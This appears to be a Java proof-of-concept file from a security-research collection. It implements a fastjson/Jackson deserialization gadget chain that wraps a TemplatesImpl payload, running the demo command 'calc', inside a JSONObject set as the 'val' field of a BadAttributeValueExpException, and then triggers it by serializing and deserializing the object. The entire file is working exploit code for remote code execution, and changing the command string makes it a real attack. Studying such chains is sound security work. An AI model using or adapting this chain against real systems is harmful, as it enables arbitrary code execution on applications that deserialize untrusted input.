package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class BATemplatesChain {
    public static void main(String[] args) throws Exception {
        SerializeUtils.OverideJackson();
        Templates templates = SerializeUtils.getTemplate("calc");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pop",templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("anything");
        SerializeUtils.setFieldValue(badAttributeValueExpException,"val",jsonObject);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
    }
}
